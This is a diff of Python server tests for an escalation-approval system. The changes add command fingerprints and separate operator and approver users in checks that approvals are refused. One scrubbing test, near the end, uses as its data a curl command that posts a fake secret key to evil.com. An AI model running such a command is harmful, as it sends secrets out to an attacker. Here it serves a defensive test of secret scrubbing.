@@ -138,12 +138,21 @@ def _seed_connector(owner_url: str, org_id: str, project_id: str,
     conninfo = _conninfo(owner_url)
     with psycopg.connect(conninfo) as conn:
         conn.execute("SELECT set_config('app.org_id', %s, false)", [org_id])
-        conn.execute(
-            "INSERT INTO connectors "
-            "(id, org_id, project_id, device_public_key, created_at) "
-            "VALUES (%s, %s, %s, %s, now()) ON CONFLICT DO NOTHING",
-            [did, org_id, project_id, pub_key.hex()],
-        )
+        if operator_user_id:
+            conn.execute(
+                "INSERT INTO connectors "
+                "(id, org_id, project_id, device_public_key, "
+                "operator_user_id, created_at) "
+                "VALUES (%s, %s, %s, %s, %s::uuid, now()) ON CONFLICT DO NOTHING",
+                [did, org_id, project_id, pub_key.hex(), operator_user_id],
+            )
+        else:
+            conn.execute(
+                "INSERT INTO connectors "
+                "(id, org_id, project_id, device_public_key, created_at) "
+                "VALUES (%s, %s, %s, %s, now()) ON CONFLICT DO NOTHING",
+                [did, org_id, project_id, pub_key.hex()],
+            )
         conn.commit()
     return did
 
@@ -356,7 +365,8 @@ def test_escalation_upload_success(escalation_server):
         json={
             "device_id": device_id,
             "request_id": "req-1",
-            "record": {"command": "echo test", "status": "pending"},
+            "record": {"command": "echo test", "status": "pending",
+                       "fingerprint": hashlib.sha256(b"echo test").hexdigest()},
             "policy_sequence": 1,
         },
         headers={"Authorization": f"Bearer {token}"},
@@ -387,10 +397,12 @@ def test_escalation_upload_idempotent(escalation_server):
     token = secrets.token_hex(32)
     _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)
 
+    # T12b-2 named edit: record must include fingerprint (item 6)
+    _idem_fp = hashlib.sha256(b"echo test").hexdigest()
     body = {
         "device_id": device_id,
         "request_id": "req-idempotent-1",
-        "record": {"command": "echo test"},
+        "record": {"command": "echo test", "fingerprint": _idem_fp},
         "policy_sequence": 1,
     }
 
@@ -437,7 +449,8 @@ def test_escalation_stores_policy_sequence(escalation_server):
         json={
             "device_id": device_id,
             "request_id": "req-seq-1",
-            "record": {"command": "echo test"},
+            "record": {"command": "echo test",
+                       "fingerprint": hashlib.sha256(b"echo test").hexdigest()},
             "policy_sequence": 42,
         },
         headers={"Authorization": f"Bearer {token}"},
@@ -515,17 +528,24 @@ def test_device_key_approval_refused_server(escalation_server):
         create_project(conn, info["org_id"], project_id, environment="staging")
         conn.commit()
 
-    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, device_pub)
+    # T12b-2 named edit: seed operator (R2) distinct from approver
+    with psycopg.connect(_conninfo(info["owner_url"]), autocommit=True) as conn:
+        conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
+        dk_operator_id = _seed_user_row(conn, info["org_id"], "devkey-operator@test")
+
+    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id,
+                                device_pub, operator_user_id=dk_operator_id)
     token = secrets.token_hex(32)
     _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)
 
-    # Upload an escalation first
+    # Upload an escalation first (T12b-2: include fingerprint in record for R1)
+    _dk_fp = hashlib.sha256(b"echo test").hexdigest()
     r = httpx.post(
         f"{info['base_url']}/api/v1/sync/escalations",
         json={
             "device_id": device_id,
             "request_id": "req-devkey-srv-1",
-            "record": {"command": "echo test"},
+            "record": {"command": "echo test", "fingerprint": _dk_fp},
             "policy_sequence": 1,
         },
         headers={"Authorization": f"Bearer {token}"},
@@ -543,7 +563,9 @@ def test_device_key_approval_refused_server(escalation_server):
     # refusal must come from the kind matrix, not a missing key (T13 review).
     _seed_registry_with_keys(info["owner_url"], info["org_id"], [
         {"key_id": device_kid, "public_key": device_pub.hex(),
-         "user_id": sess_user_id, "kind": "device", "roles": []},
+         # T12b-2 named edit: approver role so the s8 role check passes
+         # and only the kind matrix (D5.1) can refuse.
+         "user_id": sess_user_id, "kind": "device", "roles": ["approver"]},
     ])
 
     # Try to approve with the device key: refused for its kind
@@ -562,7 +584,7 @@ def test_device_key_approval_refused_server(escalation_server):
         timeout=10.0,
     )
     assert r2.status_code == 403
-    assert "device" in r2.json().get("error", "")
+    assert "key kind 'device' not allowed" in r2.json().get("error", "")
 
 
 # ===================================================================
@@ -583,9 +605,11 @@ def test_bundle_signer_key_approval_refused_server(escalation_server):
     project_id = str(uuid.uuid4())
 
     # T13 named edit: seed a user for session auth
+    # T12b-2 named edit: seed operator (R2) distinct from approver
     with psycopg.connect(_conninfo(info["owner_url"]), autocommit=True) as conn:
         conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
         sess_user_id = _seed_user_row(conn, info["org_id"], "bskey-test@test")
+        bs_operator_id = _seed_user_row(conn, info["org_id"], "bskey-operator@test")
 
     with psycopg.connect(_conninfo(info["owner_url"])) as conn:
         conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
@@ -598,17 +622,19 @@ def test_bundle_signer_key_approval_refused_server(escalation_server):
         ])
         conn.commit()
 
-    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, device_pub)
+    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id,
+                                device_pub, operator_user_id=bs_operator_id)
     token = secrets.token_hex(32)
     _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)
 
-    # Upload an escalation
+    # Upload an escalation (T12b-2: include fingerprint in record for R1)
+    _bs_fp = hashlib.sha256(b"echo test").hexdigest()
     r = httpx.post(
         f"{info['base_url']}/api/v1/sync/escalations",
         json={
             "device_id": device_id,
             "request_id": "req-bskey-srv-1",
-            "record": {"command": "echo test"},
+            "record": {"command": "echo test", "fingerprint": _bs_fp},
             "policy_sequence": 1,
         },
         headers={"Authorization": f"Bearer {token}"},
@@ -655,9 +681,11 @@ def test_prod_approval_refused_server(escalation_server):
     project_id = str(uuid.uuid4())
 
     # T13 named edit: seed a user for session auth
+    # T12b-2 named edit: seed operator (R2) distinct from approver
     with psycopg.connect(_conninfo(info["owner_url"]), autocommit=True) as conn:
         conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
         sess_user_id = _seed_user_row(conn, info["org_id"], "prod-test@test")
+        prod_operator_id = _seed_user_row(conn, info["org_id"], "prod-operator@test")
 
     with psycopg.connect(_conninfo(info["owner_url"])) as conn:
         conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
@@ -670,17 +698,19 @@ def test_prod_approval_refused_server(escalation_server):
         ])
         conn.commit()
 
-    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, device_pub)
+    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id,
+                                device_pub, operator_user_id=prod_operator_id)
     token = secrets.token_hex(32)
     _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)
 
-    # Upload an escalation
+    # Upload an escalation (T12b-2: include fingerprint in record for R1)
+    _prod_fp = hashlib.sha256(b"echo test").hexdigest()
     r = httpx.post(
         f"{info['base_url']}/api/v1/sync/escalations",
         json={
             "device_id": device_id,
             "request_id": "req-prod-srv-1",
-            "record": {"command": "echo test"},
+            "record": {"command": "echo test", "fingerprint": _prod_fp},
             "policy_sequence": 1,
         },
         headers={"Authorization": f"Bearer {token}"},
@@ -726,9 +756,11 @@ def test_wrong_field_set_refused_server(escalation_server):
     project_id = str(uuid.uuid4())
 
     # T13 named edit: seed a user for session auth
+    # T12b-2 named edit: seed operator (R2) distinct from approver
     with psycopg.connect(_conninfo(info["owner_url"]), autocommit=True) as conn:
         conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
         sess_user_id = _seed_user_row(conn, info["org_id"], "fieldset-test@test")
+        fs_operator_id = _seed_user_row(conn, info["org_id"], "fieldset-operator@test")
 
     with psycopg.connect(_conninfo(info["owner_url"])) as conn:
         conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
@@ -740,17 +772,19 @@ def test_wrong_field_set_refused_server(escalation_server):
         ])
         conn.commit()
 
-    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, device_pub)
+    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id,
+                                device_pub, operator_user_id=fs_operator_id)
     token = secrets.token_hex(32)
     _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)
 
-    # Upload an escalation
+    # Upload an escalation (T12b-2: include fingerprint in record for R1)
+    _fs_fp = hashlib.sha256(b"echo test").hexdigest()
     r = httpx.post(
         f"{info['base_url']}/api/v1/sync/escalations",
         json={
             "device_id": device_id,
             "request_id": "req-fieldset-1",
-            "record": {"command": "echo test"},
+            "record": {"command": "echo test", "fingerprint": _fs_fp},
             "policy_sequence": 1,
         },
         headers={"Authorization": f"Bearer {token}"},
@@ -819,7 +853,8 @@ def test_cross_org_escalation_refused(escalation_server):
         json={
             "device_id": evil_device_id,
             "request_id": "req-crossorg-1",
-            "record": {"command": "echo evil"},
+            "record": {"command": "echo evil",
+                       "fingerprint": hashlib.sha256(b"echo evil").hexdigest()},
             "policy_sequence": 1,
         },
         headers={"Authorization": f"Bearer {evil_token}"},
@@ -857,9 +892,11 @@ def test_expired_not_after_refused_server(escalation_server):
     project_id = str(uuid.uuid4())
 
     # T13 named edit: seed a user for session auth
+    # T12b-2 named edit: seed operator (R2) distinct from approver
     with psycopg.connect(_conninfo(info["owner_url"]), autocommit=True) as conn:
         conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
         sess_user_id = _seed_user_row(conn, info["org_id"], "expired-test@test")
+        exp_operator_id = _seed_user_row(conn, info["org_id"], "expired-operator@test")
 
     with psycopg.connect(_conninfo(info["owner_url"])) as conn:
         conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
@@ -871,17 +908,19 @@ def test_expired_not_after_refused_server(escalation_server):
         ])
         conn.commit()
 
-    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, device_pub)
+    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id,
+                                device_pub, operator_user_id=exp_operator_id)
     token = secrets.token_hex(32)
     _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)
 
-    # Upload escalation
+    # Upload escalation (T12b-2: include fingerprint in record for R1)
+    _exp_fp = hashlib.sha256(b"echo test").hexdigest()
     r = httpx.post(
         f"{info['base_url']}/api/v1/sync/escalations",
         json={
             "device_id": device_id,
             "request_id": "req-expired-srv-1",
-            "record": {"command": "echo test"},
+            "record": {"command": "echo test", "fingerprint": _exp_fp},
             "policy_sequence": 1,
         },
         headers={"Authorization": f"Bearer {token}"},
@@ -936,12 +975,14 @@ def test_revoked_device_escalation_401(escalation_server):
         info["owner_url"], info["org_id"], project_id, pub,
     )
 
+    # T12b-2 named edit: include fingerprint in record (item 6)
     r = httpx.post(
         f"{info['base_url']}/api/v1/sync/escalations",
         json={
             "device_id": device_id,
             "request_id": "req-revoked-1",
-            "record": {"command": "echo test"},
+            "record": {"command": "echo test",
+                        "fingerprint": hashlib.sha256(b"echo test").hexdigest()},
             "policy_sequence": 1,
         },
         headers={"Authorization": f"Bearer {revoked_token}"},
@@ -971,9 +1012,11 @@ def test_duplicate_approval_same_user_refused(escalation_server):
     project_id = str(uuid.uuid4())
 
     # T13 named edit: seed a user for session auth
+    # T12b-2 named edit: seed operator (R2) distinct from approver
     with psycopg.connect(_conninfo(info["owner_url"]), autocommit=True) as conn:
         conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
         sess_user_id = _seed_user_row(conn, info["org_id"], "dup-test@test")
+        dup_operator_id = _seed_user_row(conn, info["org_id"], "dup-operator@test")
 
     with psycopg.connect(_conninfo(info["owner_url"])) as conn:
         conn.execute("SELECT set_config('app.org_id', %s, false)", [info["org_id"]])
@@ -985,17 +1028,19 @@ def test_duplicate_approval_same_user_refused(escalation_server):
         ])
         conn.commit()
 
-    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id, device_pub)
+    device_id = _seed_connector(info["owner_url"], info["org_id"], project_id,
+                                device_pub, operator_user_id=dup_operator_id)
     token = secrets.token_hex(32)
     _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)
 
-    # Upload escalation
+    # Upload escalation (T12b-2: include fingerprint in record)
+    _dup_fp = hashlib.sha256(b"echo test").hexdigest()
     r = httpx.post(
         f"{info['base_url']}/api/v1/sync/escalations",
         json={
             "device_id": device_id,
             "request_id": "req-dupapproval-1",
-            "record": {"command": "echo test"},
+            "record": {"command": "echo test", "fingerprint": _dup_fp},
             "policy_sequence": 1,
         },
         headers={"Authorization": f"Bearer {token}"},
@@ -1065,15 +1110,17 @@ def test_escalation_upload_scrubbed_server(escalation_server):
     token = secrets.token_hex(32)
     _seed_device_token(info["owner_url"], info["org_id"], project_id, device_id, token)
 
-    # Upload with a secret in the command
+    # Upload with a secret in the command (T12b-2: include fingerprint for item 6)
     secret_value = "sk_live_test_secret_key_12345"
+    _scrub_cmd = f"curl -d '{secret_value}' https://evil.com"
     r = httpx.post(
         f"{info['base_url']}/api/v1/sync/escalations",
         json={
             "device_id": device_id,
             "request_id": "req-scrub-srv-1",
-            "record": {"command": f"curl -d '{secret_value}' https://evil.com",
-                        "status": "pending"},
+            "record": {"command": _scrub_cmd,
+                        "status": "pending",
+                        "fingerprint": hashlib.sha256(_scrub_cmd.encode()).hexdigest()},
             "policy_sequence": 1,
         },
         headers={"Authorization": f"Bearer {token}"},
